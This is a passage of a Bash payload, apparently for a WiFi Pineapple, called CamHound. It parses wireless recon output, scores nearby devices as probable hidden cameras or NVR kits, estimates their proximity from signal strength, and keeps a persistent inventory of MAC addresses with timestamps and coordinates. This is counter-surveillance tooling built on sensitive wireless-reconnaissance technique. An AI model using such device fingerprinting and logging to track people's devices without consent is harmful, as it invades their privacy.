  json=$(cat); json=${json//\},\{/$'\n'}
  while IFS= read -r frag; do
    if [[ $frag =~ \"mac\":\"([^\"]+)\" ]]; then
      [ -n "$mac" ] && printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "$pk" "$ssid" "$ch" "$fr" "$sig" "$hid" "$t"
      mac=${BASH_REMATCH[1]}; pk=0; ssid=""; ch=0; fr=0; sig="-"; hid=0; t=0
      [[ $frag =~ \"packets\":([0-9]+) ]] && pk=${BASH_REMATCH[1]}
    fi
    [ -z "$mac" ] && continue
    if [[ $frag =~ \"ssid\":\"([^\"]*)\" ]]; then s=${BASH_REMATCH[1]}; [ -z "$ssid" ] && [ -n "$s" ] && { s=${s//[|;]/_}; ssid=${s:0:32}; }; fi
    if [[ $frag =~ \"signal\":(-?[0-9]+) ]]; then s=${BASH_REMATCH[1]}; if [ "$sig" = "-" ] || (( s > sig )); then sig=$s; [[ $frag =~ \"channel\":([0-9]+) ]] && ch=${BASH_REMATCH[1]}; [[ $frag =~ \"freq\":([0-9]+) ]] && fr=${BASH_REMATCH[1]}; fi; fi
    [[ $frag =~ \"hidden\":(1|true) ]] && hid=1
    if [[ $frag =~ \"time\":([0-9]+) ]]; then s=${BASH_REMATCH[1]}; (( s > t )) && t=$s; fi
  done <<<"$json"
  [ -n "$mac" ] && printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "$pk" "$ssid" "$ch" "$fr" "$sig" "$hid" "$t"
}
parse_cli_fallback() {   # stdout: mac|ap_mac|packets|signal|probes|freq|time|channel  (same shape rules as JQ_CLI above)
  local json frag top rest mac ap pk sig fr t ch probes p
  json=$(cat); json=${json//\},\{/$'\n'}
  while IFS= read -r frag; do
    [[ $frag =~ \"mac\":\"([^\"]+)\" ]] || continue
    [[ $frag == *\"beacon\":\{\"* || $frag == *\"response\":\{\"* ]] && continue   # an AP: a NON-EMPTY beacon/response object, as jq's length test
    # limit, accepted: a probed SSID containing { } or an escaped quote defeats the brace strip below (the jq path is exact)
    mac=${BASH_REMATCH[1]}; ap="-"; pk=0; sig="-"; fr=0; t=0; ch=0; probes=""
    # the device's own fields sit beside its probe object (keys are alphabetical on the device: freq, mac, packets,
    # probe, signal, time), and the probe values repeat time/signal/freq/channel -- so strip every nested {...}
    # group, innermost first, and read the top-level fields from what is left
    top=$frag; while [[ $top =~ (.*:)\{[^{}]*\}(.*) ]]; do top="${BASH_REMATCH[1]}${BASH_REMATCH[2]}"; done   # only groups that are a key's value: the object's own braces stay
    [[ $top =~ \"(ap_mac|bssid)\":\"([^\"]*)\" ]] && ap=${BASH_REMATCH[2]}
    [[ $top =~ \"packets\":([0-9]+) ]] && pk=${BASH_REMATCH[1]}
    [[ $top =~ \"signal\":(-?[0-9]+) ]] && sig=${BASH_REMATCH[1]}
    [[ $top =~ \"freq\":([0-9]+) ]] && fr=${BASH_REMATCH[1]}
    [[ $top =~ \"time\":([0-9]+) ]] && t=${BASH_REMATCH[1]}
    [[ $top =~ \"channel\":([0-9]+) ]] && ch=${BASH_REMATCH[1]}
    rest=${frag#*\"probe\":}; [ "$rest" = "$frag" ] && rest=""   # every "ssid" inside the probe object is a probed SSID
    while [[ $rest =~ \"ssid\":\"([^\"]*)\"(.*) ]]; do p=${BASH_REMATCH[1]}; rest=${BASH_REMATCH[2]}; [ -n "$p" ] || continue; p=${p//[|;,]/_}; probes+="${probes:+,}$p"; done
    printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "${ap:--}" "$pk" "$sig" "$probes" "$fr" "$t" "$ch"
  done <<<"$json"
}
RECON_CLI_VERB=CLIENTS   # CLIENTS on 2.0.0; DEVICES on 1.1.3, where CLIENTS is "Unknown recon command" (recon_verb_probe)
recon_verb_probe() {   # one call at start: pick the client verb this firmware has. rc 255 = unknown verb; a timeout keeps CLIENTS
  timeout 15 _pineap RECON CLIENTS format=json >/dev/null 2>&1
  [ $? = 255 ] && RECON_CLI_VERB=DEVICES
  log recon "client verb: $RECON_CLI_VERB"
}
recon_lines() {   # recon_lines APS|CLIENTS -> lines on stdout
  local what="$1" prog verb
  if [ "$what" = APS ]; then prog="$JQ_APS"; verb=APS
  elif [ "$RECON_CLI_VERB" = DEVICES ]; then prog="$JQ_DEVCLI"; verb=DEVICES
  else prog="$JQ_CLI"; verb=CLIENTS; fi
  if [ "$HAVE_JQ" = 1 ]; then
    timeout 15 _pineap RECON "$verb" format=json 2>/dev/null | jq -r "$prog" 2>/dev/null
  elif [ "$what" = APS ]; then
    timeout 15 _pineap RECON APS format=json 2>/dev/null | parse_aps_fallback
  else
    timeout 15 _pineap RECON "$verb" format=json 2>/dev/null | parse_cli_fallback
  fi
}

# ================================================================================ scoring ===
# vendor_sig mac -> VEND_TYPE/VEND_LABEL/VEND_CAT (cached per MAC; OUI rows first, then vendor regex)
vendor_sig() {
  local mac="$1" hex lbl v
  [ -n "${VEND_TYPE[$mac]+x}" ] && return 0
  vendor_of "$mac"
  hex=${mac^^}; hex=${hex//:/}
  for lbl in "${hex:0:9}" "${hex:0:7}" "${hex:0:6}"; do
    if [ -n "${SIG_OUI_LABEL[$lbl]}" ]; then
      VEND_TYPE[$mac]="OUI"; VEND_LABEL[$mac]="${SIG_OUI_LABEL[$lbl]}"; VEND_CAT[$mac]="${SIG_OUI_CAT[$lbl]}"; return 0
    fi
  done
  v="${VLOW[$mac]}"
  if [ -n "$v" ] && [ "$v" != "-" ]; then
    for lbl in "${VENDOR_ORDER[@]}"; do
      if [[ $v =~ ${SIG_VENDOR_PAT[$lbl]} ]]; then
        VEND_TYPE[$mac]="${SIG_VENDOR_TYPE[$lbl]}"; VEND_LABEL[$mac]="$lbl"; VEND_CAT[$mac]="${SIG_VENDOR_CAT[$lbl]}"; return 0
      fi
    done
  fi
  VEND_TYPE[$mac]="NONE"; VEND_LABEL[$mac]=""; VEND_CAT[$mac]=""
}
# ssid_sig "ssid" -> SSIDSIG[ssid] = "pts|label|cat|type" ("0|||" when nothing matches)
ssid_sig() {
  local s="$1" lbl best_pts=0 best=""
  [ -z "$s" ] && return 0
  [ -n "${SSIDSIG[$s]+x}" ] && return 0
  for lbl in "${SSID_ORDER[@]}"; do
    if [[ $s =~ ${SIG_SSID_PAT[$lbl]} ]]; then
      if [ "${SIG_SSID_TYPE[$lbl]}" = SSID ]; then best="$W_SSID|$lbl|${SIG_SSID_CAT[$lbl]}|SSID"; break
      elif (( W_SSID_WEAK > best_pts )); then best_pts=$W_SSID_WEAK; best="$W_SSID_WEAK|$lbl|${SIG_SSID_CAT[$lbl]}|SSID_WEAK"; fi
    fi
  done
  SSIDSIG[$s]="${best:-0|||}"
}
# score_device mac -> ID_PTS/ID_CLASSES/CONF/BANDNAME/TAGS/CAT/LANE
score_device() {
  local mac="$1" I=0 cls="" tags="" cat="" label="" vt vl ssid sp sl sc
  local role="${ROLE[$mac]}"
  local oui_pts=0 ssid_pts=0 kit_pts=0 rand=0 endpoint=0 modonly=0 ncls=0 Ieff Bh Bheff conf gate_beh=0 ev=0 lane="" band
  shopt -s nocasematch
  vendor_sig "$mac"; vt="${VEND_TYPE[$mac]}"; vl="${VEND_LABEL[$mac]}"
  case "$vt" in
    OUI|VENDOR)      oui_pts=$W_OUI; tags+=" $vl"; cat="${VEND_CAT[$mac]}"; label="$vl" ;;
    VENDOR_WEAK)     oui_pts=$W_WEAK; tags+=" $vl"; cat="${VEND_CAT[$mac]}"; label="$vl" ;;
    VENDOR_MODULE)   modonly=1; I=$((I + W_MODULE)); cat="IOTMOD"; label="$vl" ;;
    VENDOR_ENDPOINT) endpoint=1; cat="ENDPOINT"; label="$vl" ;;
  esac
  ssid="${SSID_CLEAN[$mac]}"
  if [ -n "$ssid" ]; then
    ssid_sig "$ssid"; IFS='|' read -r sp sl sc _ <<<"${SSIDSIG[$ssid]}"
    if (( sp > 0 )); then ssid_pts=$sp; tags+=" $sl"; { [ -z "$cat" ] || (( sp > oui_pts )); } && cat="$sc"; [ -z "$label" ] && label="$sl"; fi
  fi
  [ "${KITAP[$mac]}" = 1 ] && { kit_pts=$W_KIT; tags+=" KIT-AP"; cat="NVRKIT"; }
  I=$((I + oui_pts + ssid_pts + kit_pts))
  (( oui_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" OUI"; }
  (( ssid_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" SSID"; }
  (( kit_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" KIT"; }
  if [ "$role" != cli ] && [ "${HIDDEN[$mac]}" = 1 ] && { [ "$vt" = OUI ] || [ "$vt" = VENDOR ] || [ "$vt" = VENDOR_WEAK ]; }; then I=$((I + W_HIDDEN)); tags+=" HIDDEN"; fi
  if [ "$role" = cli ] && is_rand "$mac"; then rand=1; I=$((I + W_RAND)); tags+=" RAND"; fi
  [ "${KITCL[$mac]}" = 1 ] && tags+=" KIT-CL"
  [ "${KITAP[$mac]}" = "?" ] && { I=$((I + W_KIT_WEAK)); tags+=" KIT?"; }
  (( modonly )) && tags+=" MODULE"
  (( endpoint )) && I=$((I + W_ENDPOINT))
  if [ "$role" = cli ] && (( rand == 0 )) && [ -n "${PROBES[$mac]}" ]; then
    local p pr; IFS=',' read -ra pr <<<"${PROBES[$mac]}"
    for p in "${pr[@]}"; do [ -z "$p" ] && continue; ssid_sig "$p"; [ "${SSIDSIG[$p]%%|*}" != 0 ] && { I=$((I + W_PROBE)); tags+=" PROBE"; break; }; done
  fi
  [ "${BUSY[$mac]}" = 1 ] && tags+=" BUSY"
  [ -n "${SEEN_LAST[$mac]}" ] && tags+=" SEEN"
  # behaviour axis
  Bh=${BEH[$mac]:-0}; gate_beh=${BEH_GATE[$mac]:-0}; ev=${EVENT_FLAG[$mac]:-0}
  [ "${BUSY[$mac]}" = 1 ] && Bh=$((Bh + W_BUSY))
  [ -n "${BEH_VERDICT[$mac]}" ] && tags+=" ${BEH_VERDICT[$mac]}"
  (( Bh > 100 )) && Bh=100; (( Bh < -20 )) && Bh=-20
  (( I > 100 )) && I=100
  Ieff=$I; (( ncls == 1 && Ieff > 69 )) && Ieff=69
  local global_ok=0; (( rand == 0 && endpoint == 0 )) && global_ok=1
  if (( I >= 12 )); then Bheff=$Bh
  elif (( ev && global_ok )); then Bheff=$Bh
  else Bheff=$Bh; (( Bheff > 69 )) && Bheff=69; lane="STREAM"; fi
  (( I >= 45 && Bheff < 0 )) && Bheff=0
  conf=$((Ieff + Bheff)); (( conf > 100 )) && conf=100; (( conf < 0 )) && conf=0
  if [ "$lane" = STREAM ]; then
    (( conf > 69 )) && conf=69
  else
    local confirmed=0 likely=0
    (( ncls >= 2 && oui_pts + ssid_pts + kit_pts >= 80 )) && confirmed=1
    { (( oui_pts >= 45 )) || (( ssid_pts >= 45 )); } && (( gate_beh >= 25 )) && confirmed=1
    (( confirmed == 0 && conf > 79 )) && conf=79
    (( I >= 45 )) && likely=1
    (( Bh >= 55 && I >= 12 )) && likely=1
    (( ev && global_ok )) && likely=1
    (( Bh >= 70 && global_ok )) && likely=1
    (( likely == 0 && conf > 44 )) && conf=44
  fi
  (( rand && conf > 69 )) && conf=69
  (( endpoint && ev == 0 && conf > 79 )) && conf=79
  (( I <= 0 && Bh <= 0 )) && conf=0
  if [ "$lane" = STREAM ] && (( conf >= 20 )); then band=STREAM
  elif (( conf >= 80 )); then band=CONFIRMED; elif (( conf >= 45 )); then band=LIKELY
  elif (( conf >= 20 )); then band=POSSIBLE
  elif (( modonly )); then band=MODULE; else band=none; fi
  [ -z "$cat" ] && cat="UNKNOWN"
  (( modonly )) && [ "$cat" = IOTMOD ] && (( conf < 20 )) && cat="IOTMOD"
  ID_PTS[$mac]=$I; ID_CLASSES[$mac]="${cls# }"; CONF[$mac]=$conf; BANDNAME[$mac]=$band
  TAGS[$mac]="${tags# }"; CAT[$mac]="$cat"; LANE[$mac]="$lane"; ID_LABEL[$mac]="$label"
  shopt -u nocasematch
}

# RSSI_MIN list gate on the best reading known for the MAC -- the inventory's carried-over best included
# (0 = off; a device with no reading passes). A kit AP also passes when any of its kit clients does: the
# clients are NOALERT, so hiding a weak NVR behind strong cameras would lose the kit's one alert.
rssi_gate_ok() {
  (( RSSI_MIN == 0 )) && return 0
  rssi_gate_own "$1" && return 0
  [ "${KITAP[$1]}" = 1 ] || return 1
  local c; for c in ${CLIENTS_OF[$1]}; do [ "${KITCL[$c]}" = 1 ] && rssi_gate_own "$c" && return 0; done
  return 1
}
rssi_gate_own() { [[ ${RSSI_BEST[$1]:-x} =~ ^-?[0-9]+$ ]] || return 0; (( ${RSSI_BEST[$1]} >= RSSI_MIN )); }
# proximity bucket from the best RSSI over the last 3 cycles; UNK fails open
prox_of() {
  local mac="$1" best=-999 r near=$NEAR_DBM far=$FAR_DBM
  for r in ${RSSI_HIST[$mac]}; do [ "$r" = "-" ] && continue; (( r > best )) && best=$r; done
  if (( best == -999 )) || (( EPOCHSECONDS - ${LAST_SEEN[$mac]:-0} > 90 )); then PROX[$mac]="?"; return; fi
  [ "${BAND[$mac]}" = 5 ] || [ "${BAND[$mac]}" = 6 ] && { near=$((near - 7)); far=$((far - 7)); }
  [ "${ROLE[$mac]}" = cli ] && { near=$((near - 6)); far=$((far - 6)); }
  if (( best >= near )); then PROX[$mac]="N"; elif (( best < far )); then PROX[$mac]="F"; else PROX[$mac]="M"; fi
}

# record_seen mac role ssid ch freq signal time  (shared by AP and client rows)
record_seen() {
  local mac="$1" role="$2" ssid="$3" ch="$4" fr="$5" sig="$6" h
  if [ -z "${ROLE[$mac]}" ]; then
    ROLE[$mac]="$role"; FIRST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=0; RSSI_HIST[$mac]=""; FIRST_CYCLE[$mac]=$CYCLE
    if [ -n "${SEEN_FIRST[$mac]}" ]; then   # known from an earlier run: carry the cumulative evidence over
      FIRST_SEEN[$mac]=${SEEN_FIRST[$mac]}; N_SEEN[$mac]=${SEEN_N[$mac]:-0}; RETURNING=$((RETURNING + 1))
      if [[ ${SEEN_RSSI[$mac]} =~ ^-?[0-9]+$ ]]; then RSSI_BEST[$mac]=${SEEN_RSSI[$mac]}; RSSI_BEST_TS[$mac]=${SEEN_RSSI_TS[$mac]:-${SEEN_LAST[$mac]}}; fi
      [ "${SEEN_LAT[$mac]:--}" != - ] && LAT[$mac]=${SEEN_LAT[$mac]} && LON[$mac]=${SEEN_LON[$mac]}
      if [[ ${SEEN_BEH[$mac]} =~ ^-?[0-9]+$ ]] && (( SEEN_BEH[$mac] != 0 )); then
        BEH[$mac]=${SEEN_BEH[$mac]}; BEH_VERDICT[$mac]=${SEEN_VERDICT[$mac]}
        case "${SEEN_VERDICT[$mac]}" in STREAM|EVENT|EVENT?) BEH_GATE[$mac]=${SEEN_BEH[$mac]} ;; esac
        case "${SEEN_VERDICT[$mac]}" in EVENT|EVENT?) EVENT_FLAG[$mac]=1 ;; esac
      fi
    fi
    vendor_sig "$mac"
  elif [ "${ROLE[$mac]}" != "$role" ] && [ "${ROLE[$mac]}" != "ap+cli" ]; then ROLE[$mac]="ap+cli"; fi
  LAST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=$((${N_SEEN[$mac]} + 1)); SEEN_THIS_CYCLE+=("$mac")
  [ -n "$ssid" ] && SSID_CLEAN[$mac]="$ssid"
  [ "$ch" != 0 ] && CH[$mac]="$ch"
  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; band_of "$fr"; BAND[$mac]=$BAND_V; fi
  if [[ $sig =~ ^-?[0-9]+$ ]]; then
    RSSI_LAST[$mac]=$sig
    h="${RSSI_HIST[$mac]} $sig"; set -- $h; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
    if [ -z "${RSSI_BEST[$mac]}" ] || (( sig > ${RSSI_BEST[$mac]} )); then
      [ -n "${RSSI_BEST[$mac]}" ] && (( sig - ${RSSI_BEST[$mac]} >= 3 )) && RSSI_IMPROVED[$mac]=1
      [ -z "${RSSI_BEST[$mac]}" ] && RSSI_IMPROVED[$mac]=1
      RSSI_BEST[$mac]=$sig; RSSI_BEST_TS[$mac]=$EPOCHSECONDS
    fi
  else
    RSSI_HIST[$mac]="${RSSI_HIST[$mac]} -"; set -- ${RSSI_HIST[$mac]}; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
  fi
}
declare -A RSSI_IMPROVED FIRST_CYCLE
# packet-rate delta (clients): RATE x10 frames/s between polls
rate_update() {
  local mac="$1" pk="$2" now=$EPOCHSECONDS dt dp
  if [ -n "${PREV_PKT[$mac]}" ] && (( now - ${PREV_T[$mac]} <= 2 * CYCLE_SECS )) && (( LAST_LOCK_TS < ${PREV_T[$mac]} )); then
    dt=$((now - ${PREV_T[$mac]})); dp=$((pk - ${PREV_PKT[$mac]}))
    if (( dt > 0 && dp >= 0 )); then RATE[$mac]=$((dp * 10 / dt)); else RATE[$mac]=""; fi
  else RATE[$mac]=""; fi
  PREV_PKT[$mac]=$pk; PREV_T[$mac]=$now
}

# ---- shared helpers (also used by the recon hooks) ----
confirm() {   # confirm "question" -> 0 only when the operator confirmed
  local resp rc
  resp=$(CONFIRMATION_DIALOG "$1" 2>/dev/null); rc=$?
  (( rc != 0 )) && return 1
  if [ -n "${DUCKYSCRIPT_USER_CONFIRMED:-}" ]; then [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; else [[ ${resp,,} =~ ^(1|yes|y|true|confirmed)$ ]]; fi
}
count_band() { local m n=0; for m in "${!BANDNAME[@]}"; do [ "${BANDNAME[$m]}" = "$1" ] && n=$((n + 1)); done; printf '%s' "$n"; }
watchable() {
  local mac="$1"
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  if [ "${ROLE[$mac]}" = cli ]; then [ -n "${AP_OF[$mac]}" ] && [ "${AP_OF[$mac]}" != "-" ] || return 1; fi
  return 0
}
is_setup_ap() { local s="${SSID_CLEAN[$1]}"; [ "${ROLE[$1]}" != cli ] && [ -n "$s" ] && [ "${SSIDSIG[$s]##*|}" = SSID ]; }
auto_offer_ok() { watchable "$1" && ! is_setup_ap "$1"; }
INV_HDR='#first_seen|last_seen|run_id|mac|role|cat|vendor|label|conf|id_score|beh_score|beh_verdict|band|ssid|ap_bssid|ch|freq|rssi_best|rssi_best_ts|rssi_last|prox|n_seen|pkt_rate|signals|lan_tag|lat|lon'
inv_row() {   # inv_row mac -> stdout one row
  local m="$1"
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
    "${FIRST_SEEN[$m]}" "${LAST_SEEN[$m]}" "$RUN_ID" "$m" "${ROLE[$m]}" "${CAT[$m]:-UNKNOWN}" "${VENDOR[$m]:--}" "${ID_LABEL[$m]:--}" \
    "${CONF[$m]:-0}" "${ID_PTS[$m]:-0}" "${BEH[$m]:-0}" "${BEH_VERDICT[$m]:--}" "${BAND[$m]:-?}" "${SSID_CLEAN[$m]:--}" "${AP_OF[$m]:--}" \
    "${CH[$m]:--}" "${FREQ[$m]:--}" "${RSSI_BEST[$m]:--}" "${RSSI_BEST_TS[$m]:--}" "${RSSI_LAST[$m]:--}" "${PROX[$m]:-?}" "${N_SEEN[$m]:-0}" \
    "${RATE[$m]:--}" "${TAGS[$m]:--}" "-" "${LAT[$m]:--}" "${LON[$m]:--}"
}
upsert_inventory() { (( ${#SCORED[@]} )) || return 0; upsert_rows "${!SCORED[@]}"; }
# ---- persistence across runs: inventory.tsv is the store ----
declare -A SEEN_LAST SEEN_CONF SEEN_RSSI SEEN_RSSI_TS SEEN_FIRST SEEN_N SEEN_LAT SEEN_LON SEEN_BEH SEEN_VERDICT
CLOCK_OK=1; RETURNING=0; LOADED_ROWS=0; DEDUPE_RUN=1
load_inventory() {   # read inventory.tsv once at start into SEEN_*; prune rows older than INVENTORY_KEEP_DAYS; clock guard
  local f="$LOOT_DIR/inventory.tsv" fs ls mac conf beh verdict rb rbts n lat lon maxls=0 cutoff=0
  [ -s "$f" ] || return 0
  (( INVENTORY_KEEP_DAYS > 0 )) && cutoff=$(( EPOCHSECONDS - INVENTORY_KEEP_DAYS * 86400 ))
  while IFS='|' read -r fs ls _ mac _ _ _ _ conf _ beh verdict _ _ _ _ _ rb rbts _ _ n _ _ _ lat lon; do
    [[ $fs =~ ^[0-9]+$ && $ls =~ ^[0-9]+$ ]] || continue
    (( ls > maxls )) && maxls=$ls
    SEEN_LAST[$mac]=$ls; SEEN_CONF[$mac]=${conf:-0}; SEEN_RSSI[$mac]=${rb:--}; SEEN_RSSI_TS[$mac]=${rbts:--}; SEEN_FIRST[$mac]=$fs; SEEN_N[$mac]=${n:-0}
    SEEN_LAT[$mac]=${lat:--}; SEEN_LON[$mac]=${lon:--}; SEEN_BEH[$mac]=${beh:-0}; SEEN_VERDICT[$mac]=${verdict:--}
    LOADED_ROWS=$((LOADED_ROWS + 1))
  done <"$f"
  if (( maxls > EPOCHSECONDS )); then
    CLOCK_OK=0; log warn "clock invalid: inventory newer than now; dedupe and prune disabled"; ui_ok && LOG yellow "clock invalid: dedupe off"; return 0
  fi
  if (( cutoff > 0 )); then
    awk -F'|' -v c="$cutoff" '/^#/ { print; next } $2 ~ /^[0-9]+$/ && $2 >= c { print }' "$f" >"$f.new" 2>/dev/null && mv "$f.new" "$f"
    for mac in "${!SEEN_LAST[@]}"; do (( ${SEEN_LAST[$mac]} < cutoff )) && unset "SEEN_LAST[$mac]" "SEEN_CONF[$mac]" "SEEN_RSSI[$mac]" "SEEN_RSSI_TS[$mac]" "SEEN_FIRST[$mac]" "SEEN_N[$mac]" "SEEN_LAT[$mac]" "SEEN_LON[$mac]" "SEEN_BEH[$mac]" "SEEN_VERDICT[$mac]"; done
  fi
  return 0
}
dedupe_known() {   # dedupe_known mac rank -> 0 when an earlier run (within DEDUPE_H) already had this device at this rank or higher
  local mac="$1" rank="$2" sr=0 c
  (( DEDUPE_H > 0 && DEDUPE_RUN == 1 && CLOCK_OK == 1 )) || return 1
  [ -n "${SEEN_LAST[$mac]}" ] || return 1
  (( EPOCHSECONDS - ${SEEN_LAST[$mac]} < DEDUPE_H * 3600 )) || return 1
  c=${SEEN_CONF[$mac]:-0}; if (( c >= 80 )); then sr=3; elif (( c >= 45 )); then sr=2; elif (( c >= 20 )); then sr=1; fi
  (( sr >= rank )) || return 1
  if [[ ${SEEN_RSSI[$mac]} =~ ^-?[0-9]+$ && ${RSSI_LAST[$mac]:-x} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]} - ${SEEN_RSSI[$mac]} >= 10 )); then return 1; fi
  return 0
}
upsert_rows() {   # upsert_rows mac... -> merge these rows into inventory.tsv (randomised client MACs are not stored)
  local m f="$LOOT_DIR/inventory.tsv"
  { for m in "$@"; do [ -n "${ROLE[$m]}" ] || continue; [ "${ROLE[$m]}" = cli ] && is_rand "$m" && continue; inv_row "$m"; done; } >/tmp/cs_rows.tmp
  [ -s /tmp/cs_rows.tmp ] || return 0
  [ -s "$f" ] || printf '%s\n' "$INV_HDR" >"$f"
  awk -F'|' 'NR==FNR { new[$4]=$0; next } /^#/ { print; next } { if ($4 in new) { print new[$4]; delete new[$4] } else print } END { for (k in new) print new[k] }' /tmp/cs_rows.tmp "$f" >"$f.new" 2>/dev/null && mv "$f.new" "$f"
  rm -f /tmp/cs_rows.tmp
  (( CYCLE % 5 == 0 )) && sync
  return 0
}
pick_list() {
  local title="$1" def="$2"; shift 2
  local -a items=("$@") page
  local start=0 n=${#items[@]} resp rc
  while :; do
    page=("${items[@]:$start:9}")
    (( start + 9 < n )) && page+=("More...")
    (( start > 0 )) && page+=("<- Prev")
    (( ${#page[@]} == 0 )) && { PICK=""; return 1; }
    resp=$(LIST_PICKER "$title" "${page[@]}" "${def:-${page[0]}}" 2>/dev/null); rc=$?
    (( rc != 0 )) && { PICK=""; return 1; }
    case "$resp" in
      "More...") start=$((start + 9)); def="" ;;
      "<- Prev") start=$((start - 9)); (( start < 0 )) && start=0; def="" ;;
      "") PICK=""; return 1 ;;
      *) PICK="$resp"; return 0 ;;
    esac
  done
}
PICK=""
preflight() {
  local i a
  mkdir -p "$LOOT_DIR" 2>/dev/null
  printf -v RUN_ID '%(%Y%m%d_%H%M%S)T' -1; RUN_T0=$EPOCHSECONDS
  if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamHound: _pineap not found" 2>/dev/null; exit 0; fi
  if jq_works; then HAVE_JQ=1
  elif command -v jq >/dev/null 2>&1; then          # present but unusable: say so, do not go silent
    log warn "jq present but cannot run our programs: using the fallback parsers"
    ui_ok && LOG yellow "jq unusable: fallback parser"
  fi
  recon_verb_probe
  capture_ready && HAVE_TCPDUMP=1
  [ -r "$OUI_FILE" ] || OUI_FILE="$OUI_FILE_ALT"
  [ -r "$OUI_FILE" ] || LOG yellow "no oui.txt: vendor rows disabled, OUI rows only"
  for i in wlan0 wlan1 wlan1mon wlan0cli wlan0mon; do a=$(cat "/sys/class/net/$i/address" 2>/dev/null); [ -n "$a" ] && OWN_MACS+="${a,,} "; done
  a=$(uci -q get pineapd.wlan1mon.bands 2>/dev/null || uci -q get pineapd.wlan1.bands 2>/dev/null); a=${a//[![:alnum:],]/}
  [ -n "$a" ] && { BANDS_LINE="$a"; [[ $a != *6* ]] && BANDS_LINE+=" (6 GHz not scanned)"; }
  if [ -f "$INSTALL_DIR/cam_signatures.txt" ]; then load_signatures "$INSTALL_DIR/cam_signatures.txt"; SIG_SOURCE="file"; fi
  if (( SIG_COUNT < 10 )); then load_signatures <(builtin_signatures); SIG_SOURCE="built-in"; fi
  (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamHound: no signatures" 2>/dev/null; exit 0; }
  load_inventory
  inj_probe || LOG yellow "regulatory probe failed: injectable channels limited to the set that is safe in any domain"
}
BANDS_LINE=""; INSTALL_DIR=""
run_lock() {
  local pid
  pid=$(cat "$LOCK_FILE" 2>/dev/null)
  if [[ $pid =~ ^[0-9]+$ ]] && kill -0 "$pid" 2>/dev/null && grep -qa payload "/proc/$pid/cmdline" 2>/dev/null; then
    LOG red "CamHound already running (pid $pid)"; exit 0
  fi
  kill_children; pkill -f "^_pineap MONITOR" 2>/dev/null   # anchored: only a real MONITOR process
  printf '%s' "$$" >"$LOCK_FILE"; : >"$CHILD_FILE"
  trap cleanup EXIT INT TERM
  # watchdog: if the UI kills this process (SIGKILL), release children and the EXAMINE lock
  ( while kill -0 "$MAIN_PID" 2>/dev/null; do sleep 3; done
    while read -r p; do [ -n "$p" ] && kill -TERM "$p" 2>/dev/null; done <"$CHILD_FILE" 2>/dev/null
    _pineap EXAMINE CANCEL; PINEAPPLE_EXAMINE_RESET
    [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$MAIN_PID" ] && rm -f "$LOCK_FILE" "$CHILD_FILE"
    bands_watchdog_restore ) >/dev/null 2>&1 &
}
# A band write the dead run issued is undone by its own watchdog. Keyed on the record, not on the lock: the record
# (BANDS_STATE, "<bands> <pid>") names the run that wrote it, and only that run's watchdog replays it, whoever holds
# the lock now -- a Recon hook started since never replays (it has no bands code), a new user payload replays any
# record at its start (bands_recover) and then writes its own under its own pid, which is left alone here. The record
# is claimed by rename before it is acted on, so a replay racing this watchdog cannot act on it twice.
bands_watchdog_restore() {
  local b pid claim="$BANDS_STATE.$MAIN_PID"
  read -r b pid <"$BANDS_STATE" 2>/dev/null || return 0
  [ "$pid" = "$MAIN_PID" ] || return 0                               # another run's record: theirs to replay
  mv -f "$BANDS_STATE" "$claim" 2>/dev/null || return 0               # a new run's bands_recover claimed it first
  read -r b pid <"$claim" 2>/dev/null
  if [ "$pid" != "$MAIN_PID" ]; then mv -f "$claim" "$BANDS_STATE" 2>/dev/null; return 0; fi   # changed hands in between: give it back
  if [[ $b =~ ^[256](,[256])*$ ]]; then
    # shellcheck disable=SC2086   # the tokens are the argument list
    PINEAPPLE_SET_BANDS "$RECON_IF" ${b//,/ } >/dev/null 2>&1
    log bands "restored $b by the watchdog (run $MAIN_PID killed)"
  fi
  rm -f "$claim"
}
# --- camhound lib end ---
# --- watch core begin ---
# pcap parser: hexdump words -> per-second buckets "ts bytes frames big" (all four magics; -s 32 records)
PCAP_AWK='
function swap(w) { return (w % 256) * 16777216 + (int(w / 256) % 256) * 65536 + (int(w / 65536) % 256) * 256 + int(w / 16777216) }
function rd(w) { return sw ? swap(w) : w }
NR == 1 { m = $1
  if (m == 2712847316 || m == 2712812077) sw = 0
  else if (m == 3569595041 || m == 1295823521) sw = 1
  else { print "parse error magic " m; bad = 1; exit 1 }
  next }
NR <= 6 { next }
skip > 0 { skip--; next }
{ hdr[++h] = rd($1)
  if (h == 4) { ts = hdr[1]; il = hdr[3]; ol = hdr[4]; h = 0
    if (il % 4 != 0) { print "parse error incl_len " il; bad = 1; exit 1 }
    skip = il / 4; B[ts] += ol; F[ts]++; if (ol >= big) G[ts]++
    if (!(ts in seen)) { seen[ts] = 1; order[++n] = ts } } }
END { if (bad) exit 1; for (i = 1; i <= n; i++) { t = order[i]; print t, B[t] + 0, F[t] + 0, G[t] + 0 } }'
pcap_words() { if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/4 "%u\n"' "$1" 2>/dev/null; else od -An -v -tu4 -w4 "$1" 2>/dev/null | tr -d ' '; fi; }
pcap_buckets() { pcap_words "$1" | awk -v big="$BIG_BYTES" "$PCAP_AWK"; }

# bucket_stats file -> "secs frames bytes big maxbig cv10" over the bucket lines (cv on per-second big counts)
bucket_stats() {
